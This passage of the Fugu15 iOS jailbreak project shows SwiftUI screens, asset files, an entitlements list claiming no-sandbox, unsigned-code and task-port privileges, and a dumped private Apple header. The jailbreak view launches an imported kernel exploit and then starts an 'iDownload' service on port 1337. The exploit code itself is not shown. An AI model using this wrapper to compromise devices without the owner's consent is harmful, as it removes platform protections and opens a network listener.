struct AboutView_Previews: PreviewProvider {
    static var previews: some View {
        AboutView()
    }
}

```

`Fugu15/Fugu15/Assets.xcassets/AccentColor.colorset/Contents.json`:

```json
{
  "colors" : [
    {
      "color" : {
        "color-space" : "srgb",
        "components" : {
          "alpha" : "1.000",
          "blue" : "0.439",
          "green" : "0.373",
          "red" : "0.949"
        }
      },
      "idiom" : "universal"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Fugu15/Fugu15/Assets.xcassets/AppIcon.appiconset/Contents.json`:

```json
{"images":[{"size":"60x60","expected-size":"180","filename":"180.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"3x"},{"size":"40x40","expected-size":"80","filename":"80.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"2x"},{"size":"40x40","expected-size":"120","filename":"120.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"3x"},{"size":"60x60","expected-size":"120","filename":"120.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"2x"},{"size":"57x57","expected-size":"57","filename":"57.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"1x"},{"size":"29x29","expected-size":"58","filename":"58.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"2x"},{"size":"29x29","expected-size":"29","filename":"29.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"1x"},{"size":"29x29","expected-size":"87","filename":"87.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"3x"},{"size":"57x57","expected-size":"114","filename":"114.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"2x"},{"size":"20x20","expected-size":"40","filename":"40.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"2x"},{"size":"20x20","expected-size":"60","filename":"60.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"iphone","scale":"3x"},{"size":"1024x1024","filename":"1024.png","expected-size":"1024","idiom":"ios-marketing","folder":"Assets.xcassets/AppIcon.appiconset/","scale":"1x"},{"size":"40x40","expected-size":"80","filename":"80.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"2x"},{"size":"72x72","expected-size":"72","filename":"72.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"1x"},{"size":"76x76","expected-size":"152","filename":"152.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"2x"},{"size":"50x50","expected-size":"100","filename":"100.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"2x"},{"size":"29x29","expected-size":"58","filename":"58.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"2x"},{"size":"76x76","expected-size":"76","filename":"76.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"1x"},{"size":"29x29","expected-size":"29","filename":"29.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"1x"},{"size":"50x50","expected-size":"50","filename":"50.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"1x"},{"size":"72x72","expected-size":"144","filename":"144.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"2x"},{"size":"40x40","expected-size":"40","filename":"40.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"1x"},{"size":"83.5x83.5","expected-size":"167","filename":"167.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"2x"},{"size":"20x20","expected-size":"20","filename":"20.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"1x"},{"size":"20x20","expected-size":"40","filename":"40.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"ipad","scale":"2x"},{"size":"128x128","expected-size":"128","filename":"128.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"1x"},{"size":"256x256","expected-size":"256","filename":"256.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"1x"},{"size":"128x128","expected-size":"256","filename":"256.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"2x"},{"size":"256x256","expected-size":"512","filename":"512.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"2x"},{"size":"32x32","expected-size":"32","filename":"32.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"1x"},{"size":"512x512","expected-size":"512","filename":"512.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"1x"},{"size":"16x16","expected-size":"16","filename":"16.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"1x"},{"size":"16x16","expected-size":"32","filename":"32.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"2x"},{"size":"32x32","expected-size":"64","filename":"64.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"2x"},{"size":"512x512","expected-size":"1024","filename":"1024.png","folder":"Assets.xcassets/AppIcon.appiconset/","idiom":"mac","scale":"2x"}]}
```

`Fugu15/Fugu15/Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Fugu15/Fugu15/Assets.xcassets/FuguIcon.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "256.png",
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "filename" : "512.png",
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "1024.png",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Fugu15/Fugu15/Assets.xcassets/PinautenLogo.imageset/Contents.json`:

```json
{
  "images" : [
    {
      "filename" : "Pinauten_Logo_SecResearch_1024.png",
      "idiom" : "universal",
      "scale" : "1x"
    },
    {
      "filename" : "Pinauten_Logo_SecResearch_2048.png",
      "idiom" : "universal",
      "scale" : "2x"
    },
    {
      "filename" : "Pinauten_Logo_SecResearch_4096.png",
      "idiom" : "universal",
      "scale" : "3x"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Fugu15/Fugu15/ContentView.swift`:

```swift
//
//  ContentView.swift
//  Fugu15
//
//  Created by Linus Henze.
//

import SwiftUI

#if os(iOS)
import UIKit
#else
import AppKit
#endif

import Fugu15KernelExploit

struct ContentView: View {
    @State var logText = ""
    @State private var showingRemoveFrame = RemoveFuguInstall.shouldShow()
    
    var body: some View {
        NavigationView {
            VStack {
                Divider()
                
                TabView {
                    JailbreakView(logText: $logText)
                        .tabItem {
                            Label("Jailbreak", systemImage: "wand.and.stars")
                        }
                    
                    LogView(logText: $logText)
                        .tabItem {
                            Label("Log", systemImage: "doc.text.magnifyingglass")
                        }
                    
                    AboutView()
                        .tabItem {
                            Label("About", systemImage: "info.circle")
                        }
                }
                    .sheet(isPresented: $showingRemoveFrame) {
                        RemoveFuguInstall(isPresented: $showingRemoveFrame)
                    }
                    .navigationTitle("Fugu15")
                    .navigationBarTitleDisplayMode(.inline)
            }
        }.navigationViewStyle(.stack)
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}

```

`Fugu15/Fugu15/Fugu15-Bridging-Header.h`:

```h
//
//  Use this file to import your target's public headers that you would like to expose to Swift.
//

#include "posix_spawn.h"
#include "LSApplicationWorkspace.h"
#include "LSApplicationProxy.h"

```

`Fugu15/Fugu15/Fugu15.entitlements`:

```entitlements
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>com.apple.security.get-task-allow</key>
	<true/>
	<key>get-task-allow</key>
	<true/>
	<key>platform-application</key>
	<true/>
	<key>task_for_pid-allow</key>
	<true/>
	<key>run-unsigned-code</key>
	<true/>
	<key>proc_info-allow</key>
	<true/>
	<key>com.apple.private.persona-mgmt</key>
	<true/>
	<key>com.apple.private.tcc.allow</key>
	<array>
		<string>kTCCServiceSystemPolicyAllFiles</string>
	</array>
	<key>com.apple.private.security.no-container</key>
	<true/>
	<key>com.apple.private.security.storage-exempt.heritable</key>
	<true/>
	<key>com.apple.private.security.storage.AppBundles</key>
	<true/>
	<key>com.apple.private.security.no-sandbox</key>
	<true/>
	<key>com.apple.springboard.CFUserNotification</key>
	<true/>
	<key>com.apple.springboard.launchapplications</key>
	<true/>
	<key>com.apple.security.network.client</key>
	<true/>
	<key>com.apple.system-task-ports.control</key>
	<true/>
	<key>com.apple.system-task-ports.token.control</key>
	<true/>
	<key>com.apple.private.mobileinstall.allowedSPI</key>
	<array>
		<string>InstallForLaunchServices</string>
		<string>Install</string>
		<string>UninstallForLaunchServices</string>
		<string>Uninstall</string>
		<string>UpdatePlaceholderMetadata</string>
	</array>
	<key>com.apple.private.spawn-driver</key>
	<true/>
	<key>com.apple.developer.driverkit</key>
	<true/>
	<key>com.apple.developer.driverkit.transport.pci</key>
	<true/>
	<key>com.apple.developer.driverkit.builtin</key>
	<true/>
	<key>com.apple.developer.driverkit.transport.pci.offloadEngineDisable</key>
	<true/>
	<key>com.apple.private.security.kext-collection-management</key>
	<true/>
	<key>com.apple.private.security.kext-management</key>
	<true/>
	<key>com.apple.private.security.syspolicy.kext-management</key>
	<true/>
</dict>
</plist>

```

`Fugu15/Fugu15/Fugu15App.swift`:

```swift
//
//  Fugu15App.swift
//  Fugu15
//
//  Created by Linus Henze.
//

import SwiftUI

struct Fugu15App: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

```

`Fugu15/Fugu15/Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>TSRootBinaries</key>
	<array>
		<string>oobPCI</string>
		<string>tar</string>
	</array>
	<key>UISupportedInterfaceOrientations~ipad</key>
	<array>
		<string>UIInterfaceOrientationPortrait</string>
		<string>UIInterfaceOrientationLandscapeLeft</string>
		<string>UIInterfaceOrientationLandscapeRight</string>
		<string>UIInterfaceOrientationPortraitUpsideDown</string>
	</array>
</dict>
</plist>

```

`Fugu15/Fugu15/JailbreakView.swift`:

```swift
//
//  JailbreakView.swift
//  Fugu15
//
//  Created by Linus Henze on 2022-07-29.
//

import SwiftUI
import Fugu15KernelExploit

enum JBStatus {
    case notStarted
    case unsupported
    case inProgress
    case failed
    case done
    
    func text() -> String {
        switch self {
        case .notStarted:
            return "Jailbreak"
            
        case .unsupported:
            return "Unsupported"
            
        case .inProgress:
            return "Jailbreaking..."
            
        case .failed:
            return "Error!"
            
        case .done:
            return "Jailbroken"
        }
    }
    
    func color() -> Color {
        switch self {
        case .notStarted:
            return .accentColor
            
        case .unsupported:
            return .accentColor
            
        case .inProgress:
            return .accentColor
            
        case .failed:
            return .red
            
        case .done:
            return .green
        }
    }
}

struct JailbreakView: View {
    @Binding var logText: String
    
    @State var status: JBStatus = .notStarted
    @State var textStatus1      = "Status: Not running"
    @State var textStatus2      = ""
    @State var textStatus3      = ""
    @State var showSuccessMsg   = false
    
    var body: some View {
        VStack {
            Button(status.text(), action: {
                status = .inProgress
                
                DispatchQueue(label: "Fugu15").async {
                    launchExploit()
                }
            })
                .padding()
                .background(status.color())
                .cornerRadius(10)
                .foregroundColor(Color.white)
                .disabled(status != .notStarted)
            
            Text(textStatus1)
                .padding([.top, .leading, .trailing])
                .font(.headline)
            Text(textStatus2)
                .padding([.leading, .trailing])
                .font(.subheadline)
                .opacity(0.5)
            Text(textStatus3)
                .padding([.leading, .trailing])
                .font(.footnote)
                .opacity(0.4)
        }.alert(isPresented: $showSuccessMsg) {
            Alert(title: Text("Success"), message: Text("All exploits succeded and iDownload is now running on port 1337!"), dismissButton: .default(Text("OK")))
        }
    }
    
    func print(_ text: String, ender: String = "\n") {
        logText += text + ender
    }
    
    func statusUpdate(_ s: String) {
        textStatus3 = textStatus2
        textStatus2 = textStatus1
        textStatus1 = s
    }
    
    func launchExploit() {
        do {
            statusUpdate("Status: Launching kexploitd")
            
            try Fugu15.launchKernelExploit(oobPCI: Bundle.main.bundleURL.appendingPathComponent("oobPCI")) { msg in
                if status != .done {
                    DispatchQueue.main.async {
                        if msg.hasPrefix("Status: ") {
                            statusUpdate(msg)
                        }
                        
                        print(msg)
                    }
                }
            }
            
            try Fugu15.launch_iDownload()
            
            DispatchQueue.main.async {
                statusUpdate("Status: Done!")
                status = .done
                showSuccessMsg = true
            }
        } catch {
            DispatchQueue.main.async {
                print("Fugu15 error: \(error)")
                status = .failed
            }
        }
    }
}

struct JailbreakView_Previews: PreviewProvider {
    @State static var logText = ""
    
    static var previews: some View {
        JailbreakView(logText: $logText)
    }
}

```

`Fugu15/Fugu15/LogView.swift`:

```swift
//
//  LogView.swift
//  Fugu15
//
//  Created by Linus Henze on 2022-07-29.
//

import SwiftUI

struct LogView: View {
    @Binding var logText: String
    
    var body: some View {
        ScrollViewReader { reader in
            ZStack {
                Text("Nothing here yet...")
                    .opacity(logText.count > 0 ? 0 : 1)
                
                ScrollView{
                    Text(logText)
                        .padding([.leading, .trailing])
                        .frame(minWidth: 0,
                               maxWidth: .infinity,
                               minHeight: 0,
                               maxHeight: .infinity,
                               alignment: .topLeading)
                        .id("label")
                        .onChange(of: logText, perform: { value in
                            reader.scrollTo("label", anchor: .bottom)
                        })
                        .contextMenu {
                            Button {
                                UIPasteboard.general.string = logText
                            } label: {
                                Label("Copy", systemImage: "doc.on.doc")
                            }
                        }
                }
            }
        }
    }
}

struct LogView_Previews: PreviewProvider {
    @State static var logText = "Example log text\nLine 2\nLine 3"
    
    static var previews: some View {
        LogView(logText: $logText)
    }
}

```

`Fugu15/Fugu15/Preview Content/Preview Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Fugu15/Fugu15/RemoveFuguInstall.swift`:

```swift
//
//  RemoveFuguInstall.swift
//  Fugu15
//
//  Created by Linus Henze on 2022-07-29.
//

import SwiftUI

struct RemoveFuguInstall: View {
    static var bundleID: String? = {
        let path = Bundle.main.bundleURL
        
        guard let data = try? Data(contentsOf: path.appendingPathComponent("FuguInstall.plist")) else {
            return nil
        }
        
        guard let plist = try? PropertyListSerialization.propertyList(from: data, format: nil) as? [String: Any] else {
            return nil
        }
        
        return plist["InstalledBy"] as? String
    }()
    
    @Binding var isPresented: Bool
    
    @State var appName = "Unknown"
    @State var showSpinner = false
    
    var body: some View {
        ZStack {
            VStack {
                HStack {
                    Text("Remove “\(appName)” App?")
                        .font(.largeTitle)
                        .fontWeight(.heavy)
                        .padding()
                    Spacer()
                }
                
                HStack {
                    Text("Fugu15 was installed via the “\(appName)” App. This App is no longer needed and can therefore be removed.")
                        .padding([.leading, .trailing, .bottom])
                    Spacer()
                }
                
                Spacer()
                
                HStack {
                    Button(action: {
                        showSpinner = true
                        DispatchQueue(label: "Uninstall").async {
                            if let id = Self.bundleID {
                                let workspace = LSApplicationWorkspace.default()!
                                workspace.uninstallApplication(id, withOptions: nil, using: {})
                            }
                            
                            DispatchQueue.main.asyncAfter(deadline: .now().advanced(by: .milliseconds(500)), execute: .init(block: {
                                showSpinner = false
                                isPresented = false
                            }))
                        }
                    }) {
                        Text("Remove “\(appName)”")
                            .frame(maxWidth: .infinity, minHeight: 50)
                            .foregroundColor(Color.white)
                            .background(Color.accentColor)
                            .cornerRadius(10)
                    }
                }.padding([.leading, .trailing])
                
                Button("Keep “\(appName)”") {
                    isPresented = false
                }
                .padding()
                    .padding(.bottom)
            }
                .padding()
                .disabled(showSpinner)
            
            if showSpinner {
                VStack() {
                    ProgressView()
                        .scaleEffect(2.0, anchor: .center)
                        .padding()
                        .padding()
                        .padding()
                        .colorInvert()
                }
                    .background(Color.primary.opacity(0.8))
                    .cornerRadius(22)
                    .ignoresSafeArea(.all)
            }
        }.onAppear {
            if let id = Self.bundleID {
                if let app = LSApplicationProxy(forIdentifier: id) {
                    if let name = app.localizedShortName {
                        appName = name
                    }
                }
            }
        }.onDisappear {
            _ = execCmd(args: [CommandLine.arguments[0], "removeFuguInstallPlist"])
        }
    }
    
    static func shouldShow() -> Bool {
        guard let id = bundleID else {
            return false
        }
        
        if let app = LSApplicationProxy(forIdentifier: id) {
            if app.isInstalled {
                return true
            }
        }
        
        return false
    }
}

struct RemoveFuguInstall_Previews: PreviewProvider {
    @State static var isPresented = true
    
    static var previews: some View {
        RemoveFuguInstall(isPresented: $isPresented)
    }
}

```

`Fugu15/Fugu15/include/LSApplicationProxy.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
* Operating System: Version 15.2.1 (Build 19C63)
* Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>
//#import <CoreServices/LSBundleProxy.h>
//#import <libobjc.A.dylib/LSDetachable.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

#import "_LSApplicationState.h"
#import "LSBundleProxy.h"

@class NSString, LSApplicationRecord, NSArray, NSDate, NSNumber, NSUUID, NSProgress, _LSDiskUsage, _LSApplicationState, NSDictionary, NSSet, LSContext;

@interface LSApplicationProxy : LSBundleProxy /*<LSDetachable, NSSecureCoding>*/ {

	NSString* _deviceIdentifierVendorName;
	LSApplicationRecord* _record;
	NSArray* _plugInKitPlugins;
	BOOL _userInitiatedUninstall;

}

@property (readonly) NSArray * if_userActivityTypes; 
@property (assign,nonatomic) BOOL userInitiatedUninstall;                                          //@synthesize userInitiatedUninstall=_userInitiatedUninstall - In the implementation block
@property (nonatomic,readonly) BOOL supportsAlternateIconNames; 
@property (nonatomic,readonly) int bundleModTime; 
@property (nonatomic,readonly) LSApplicationRecord * correspondingApplicationRecord; 
@property (nonatomic,readonly) NSString * applicationIdentifier; 
@property (nonatomic,readonly) NSString * companionApplicationIdentifier; 
@property (nonatomic,readonly) NSArray * counterpartIdentifiers; 
@property (nonatomic,readonly) NSDate * registeredDate; 
@property (nonatomic,readonly) NSNumber * itemID; 
@property (nonatomic,readonly) NSString * vendorName; 
@property (nonatomic,readonly) NSString * itemName; 
@property (nonatomic,readonly) NSString * storeCohortMetadata; 
@property (nonatomic,readonly) NSString * genre; 
@property (nonatomic,readonly) NSNumber * genreID; 
@property (nonatomic,readonly) NSArray * subgenres; 
@property (nonatomic,readonly) NSArray * staticShortcutItems; 
@property (nonatomic,readonly) NSString * minimumSystemVersion; 
@property (nonatomic,readonly) NSString * maximumSystemVersion; 
@property (nonatomic,readonly) NSString * shortVersionString; 
@property (nonatomic,readonly) NSString * preferredArchitecture; 
@property (nonatomic,readonly) NSString * applicationType; 
@property (nonatomic,readonly) NSArray * directionsModes; 
@property (nonatomic,readonly) NSArray * UIBackgroundModes; 
@property (nonatomic,readonly) NSArray * audioComponents; 
@property (nonatomic,readonly) NSUUID * deviceIdentifierForVendor; 
@property (nonatomic,readonly) NSUUID * deviceIdentifierForAdvertising; 
@property (nonatomic,readonly) NSProgress * installProgress; 
@property (nonatomic,readonly) NSNumber * staticDiskUsage; 
@property (nonatomic,readonly) NSNumber * dynamicDiskUsage; 
@property (nonatomic,readonly) NSNumber * ODRDiskUsage; 
@property (nonatomic,readonly) _LSDiskUsage * diskUsage; 
@property (nonatomic,readonly) _LSApplicationState * appState; 
@property (getter=isInstalled,nonatomic,readonly) BOOL installed; 
@property (getter=isPlaceholder,nonatomic,readonly) BOOL placeholder; 
@property (getter=isRestricted,nonatomic,readonly) BOOL restricted; 
@property (getter=isRemovedSystemApp,nonatomic,readonly) BOOL removedSystemApp; 
@property (nonatomic,readonly) NSArray * VPNPlugins; 
@property (nonatomic,readonly) NSArray * plugInKitPlugins; 
@property (nonatomic,readonly) NSArray * appTags; 
@property (nonatomic,readonly) NSString * applicationDSID; 
@property (nonatomic,readonly) NSNumber * purchaserDSID; 
@property (nonatomic,readonly) NSNumber * downloaderDSID; 
@property (nonatomic,readonly) NSNumber * familyID; 
@property (nonatomic,readonly) unsigned long long installType; 
@property (nonatomic,readonly) unsigned long long originalInstallType; 
@property (nonatomic,readonly) NSArray * requiredDeviceCapabilities; 
@property (nonatomic,readonly) NSArray * deviceFamily; 
@property (nonatomic,readonly) NSArray * activityTypes; 
@property (nonatomic,readonly) NSArray * externalAccessoryProtocols; 
@property (nonatomic,readonly) NSString * teamID; 
@property (nonatomic,readonly) NSString * appIDPrefix; 
@property (nonatomic,readonly) NSNumber * storeFront; 
@property (nonatomic,readonly) NSNumber * externalVersionIdentifier; 
@property (nonatomic,readonly) NSNumber * betaExternalVersionIdentifier; 
@property (nonatomic,readonly) NSNumber * ratingRank; 
@property (nonatomic,readonly) NSString * ratingLabel; 
@property (nonatomic,readonly) NSString * sourceAppIdentifier; 
@property (nonatomic,readonly) NSString * applicationVariant; 
@property (getter=isAppUpdate,nonatomic,readonly) BOOL appUpdate; 
@property (nonatomic,readonly) BOOL hasParallelPlaceholder; 
@property (getter=isNewsstandApp,nonatomic,readonly) BOOL newsstandApp; 
@property (getter=isWhitelisted,nonatomic,readonly) BOOL whitelisted; 
@property (getter=isAppStoreVendable,nonatomic,readonly) BOOL appStoreVendable; 
@property (getter=isDeviceBasedVPP,nonatomic,readonly) BOOL deviceBasedVPP; 
@property (getter=isBetaApp,nonatomic,readonly) BOOL betaApp; 
@property (getter=isAdHocCodeSigned,nonatomic,readonly) BOOL adHocCodeSigned; 
@property (nonatomic,readonly) BOOL supportsAudiobooks; 
@property (getter=isLaunchProhibited,nonatomic,readonly) BOOL launchProhibited; 
@property (nonatomic,readonly) BOOL supportsODR; 
@property (nonatomic,readonly) BOOL hasSettingsBundle; 
@property (nonatomic,readonly) BOOL supportsExternallyPlayableContent; 
@property (nonatomic,readonly) BOOL supportsOpenInPlace; 
@property (nonatomic,readonly) BOOL fileSharingEnabled; 
@property (nonatomic,readonly) BOOL iconIsPrerendered; 
@property (nonatomic,readonly) BOOL iconUsesAssetCatalog; 
@property (getter=isPurchasedReDownload,nonatomic,readonly) BOOL purchasedReDownload; 
@property (nonatomic,readonly) BOOL hasMIDBasedSINF; 
@property (nonatomic,readonly) BOOL missingRequiredSINF; 
@property (nonatomic,readonly) BOOL supportsPurgeableLocalStorage; 
@property (getter=isDeletable,nonatomic,readonly) BOOL deletable; 
@property (nonatomic,readonly) NSArray * managedPersonas; 
@property (getter=isRemoveableSystemApp,nonatomic,readonly) BOOL removeableSystemApp; 
@property (getter=isWatchKitApp,nonatomic,readonly) BOOL watchKitApp; 
@property (nonatomic,readonly) NSString * watchKitVersion; 
@property (nonatomic,readonly) NSString * complicationPrincipalClass; 
@property (nonatomic,readonly) NSArray * supportedComplicationFamilies; 
@property (nonatomic,readonly) BOOL hasCustomNotification; 
@property (nonatomic,readonly) BOOL hasComplication; 
@property (nonatomic,readonly) BOOL hasGlance; 
@property (nonatomic,readonly) BOOL shouldSkipWatchAppInstall; 
@property (getter=isGameCenterEnabled,nonatomic,readonly) BOOL gameCenterEnabled; 
@property (nonatomic,readonly) BOOL gameCenterEverEnabled; 
@property (nonatomic,readonly) NSNumber * installFailureReason; 
@property (nonatomic,readonly) long long deviceManagementPolicy; 
@property (nonatomic,readonly) NSDictionary * siriActionDefinitionURLs; 
@property (nonatomic,readonly) NSString * appStoreToolsBuildVersion; 
@property (nonatomic,readonly) NSSet * claimedDocumentContentTypes; 
@property (nonatomic,readonly) NSSet * claimedURLSchemes; 
@property (nonatomic,readonly) BOOL canHandleWebAuthentication; 
@property (nonatomic,readonly) BOOL supportsMultiwindow; 
@property (nonatomic,readonly) NSNumber * platform; 
@property (nonatomic,readonly) NSArray * backgroundTaskSchedulerPermittedIdentifiers; 
@property (getter=isStandaloneWatchApp,nonatomic,readonly) BOOL standaloneWatchApp; 
@property (nonatomic,readonly) BOOL runsIndependentlyOfCompanionApp; 
@property (getter=isArcadeApp,nonatomic,readonly) BOOL arcadeApp; 
@property (nonatomic,readonly) NSArray * carPlayInstrumentClusterURLSchemes; 
+(BOOL)supportsSecureCoding;
+(instancetype)applicationProxyForIdentifier:(NSString*)arg1 ;
+(instancetype)applicationProxyForSystemPlaceholder:(id)arg1 ;
+(instancetype)applicationProxyForCompanionIdentifier:(id)arg1 ;
+(instancetype)applicationProxyForItemID:(id)arg1 ;
+(instancetype)applicationProxyForIdentifier:(id)arg1 placeholder:(BOOL)arg2 ;
+(instancetype)applicationProxyForBundleURL:(id)arg1 ;
+(instancetype)applicationProxyForBundleType:(unsigned long long)arg1 identifier:(id)arg2 isCompanion:(BOOL)arg3 URL:(id)arg4 itemID:(id)arg5 bundleUnit:(unsigned*)arg6 ;
+(instancetype)applicationProxyForIdentifier:(id)arg1 withContext:(LSContext*)arg2 ;
+(instancetype)applicationProxyWithBundleUnitID:(unsigned)arg1 withContext:(LSContext*)arg2 ;
-(id)__ck_messagesPluginKitProxy;
-(id)__IS_iconDataForVariant:(int)arg1 withOptions:(int)arg2 ;
-(id)__IS_iconDataForVariant:(int)arg1 preferredIconName:(id)arg2 withOptions:(int)arg3 ;
-(id)un_applicationBundleIdentifier;
-(id)un_applicationBundleURL;
-(NSArray *)if_userActivityTypes;
-(BOOL)isGameCenterEnabled;
-(BOOL)isInstalled;
-(_LSApplicationState *)appState;
-(id)bundleType;
-(NSNumber *)ODRDiskUsage;
-(NSArray *)deviceFamily;
-(BOOL)UPPValidated;
-(id)localizedNameForContext:(id)arg1 preferredLocalizations:(id)arg2 useShortNameOnly:(BOOL)arg3 ;
-(NSString *)appIDPrefix;
-(BOOL)isAppUpdate;
-(BOOL)supportsODR;
-(BOOL)isWhitelisted;
-(int)bundleModTime;
-(id)_localizedNameWithPreferredLocalizations:(id)arg1 useShortNameOnly:(BOOL)arg2 ;
-(id)_initWithContext:(LSContext*)arg1 bundleUnit:(unsigned)arg2 applicationRecord:(id)arg3 bundleID:(id)arg4 resolveAndDetach:(BOOL)arg5 ;
-(NSString *)applicationDSID;
-(NSNumber *)staticDiskUsage;
-(BOOL)hasMIDBasedSINF;
-(id)environmentVariables;
-(id)alternateIconName;
-(BOOL)iconIsPrerendered;
-(void)getDeviceManagementPolicyWithCompletionHandler:(/*^block*/id)arg1 ;
-(NSSet *)claimedURLSchemes;
-(id)getBundleMetadata;
-(NSDate *)registeredDate;
-(BOOL)isNewsstandApp;
-(NSString *)vendorName;
-(id)_initWithBundleUnit:(unsigned)arg1 context:(LSContext*)arg2 bundleIdentifier:(id)arg3 ;
-(id)localizedNameForContext:(id)arg1 preferredLocalizations:(id)arg2 ;
-(unsigned long long)originalInstallType;
-(id)handlerRankOfClaimForContentType:(id)arg1 ;
-(NSSet *)claimedDocumentContentTypes;
-(BOOL)getGenericTranslocationTargetURL:(id*)arg1 error:(id*)arg2 ;
-(NSString *)storeCohortMetadata;
-(NSString *)sourceAppIdentifier;
-(id)groupContainerURLs;
-(BOOL)missingRequiredSINF;
-(void)setAlternateIconName:(id)arg1 withResult:(/*^block*/id)arg2 ;
-(NSString *)applicationVariant;
-(id)_managedPersonas;
-(id)iconDataForVariant:(int)arg1 ;
-(NSNumber *)dynamicDiskUsage;
-(id)installProgressSync;
-(BOOL)profileValidated;
-(NSString *)genre;
-(BOOL)iconUsesAssetCatalog;
-(void)detach;
-(BOOL)fileSharingEnabled;
-(BOOL)_usesSystemPersona;
-(NSNumber *)installFailureReason;
-(BOOL)isStandaloneWatchApp;
-(NSString *)preferredArchitecture;
-(BOOL)isPurchasedReDownload;
-(BOOL)freeProfileValidated;
-(long long)deviceManagementPolicy;
-(BOOL)userInitiatedUninstall;
-(NSDictionary *)siriActionDefinitionURLs;
-(BOOL)isRemoveableSystemApp;
-(id)localizedNameForContext:(id)arg1 ;
-(BOOL)gameCenterEverEnabled;
-(NSNumber *)betaExternalVersionIdentifier;
-(NSString *)complicationPrincipalClass;
-(id)primaryIconDataForVariant:(int)arg1 ;
-(void)setUserInitiatedUninstall:(BOOL)arg1 ;
-(id)iconDataForVariant:(int)arg1 withOptions:(int)arg2 ;
-(NSArray *)plugInKitPlugins;
-(BOOL)isDeletableIgnoringRestrictions;
-(id)dataContainerURL;
-(LSApplicationRecord *)correspondingApplicationRecord;
-(void)clearAdvertisingIdentifier;
-(BOOL)isWatchKitApp;
-(NSString *)applicationIdentifier;
-(void)encodeWithCoder:(id)arg1 ;
-(id)forwardingTargetForSelector:(SEL)arg1 ;
-(id)signerIdentity;
-(BOOL)isRemovedSystemApp;
-(unsigned long long)installType;
-(NSNumber *)ratingRank;
-(BOOL)isPlaceholder;
-(id)valueForUndefinedKey:(id)arg1 ;
-(NSArray *)requiredDeviceCapabilities;
-(id)methodSignatureForSelector:(SEL)arg1 ;
-(id)signerOrganization;
-(NSString *)companionApplicationIdentifier;
-(BOOL)isRestricted;
-(BOOL)isBetaApp;
-(NSString *)teamID;
-(BOOL)isDeviceBasedVPP;
-(NSString *)ratingLabel;
-(id)description;
-(NSNumber *)purchaserDSID;
-(NSNumber *)genreID;
-(NSNumber *)familyID;
-(NSArray *)managedPersonas;
-(NSString *)itemName;
-(NSNumber *)downloaderDSID;
-(NSNumber *)storeFront;
-(NSNumber *)itemID;
-(id)initWithCoder:(id)arg1 ;
-(NSNumber *)platform;
-(NSArray *)subgenres;
-(NSProgress *)installProgress;
-(NSString *)applicationType;
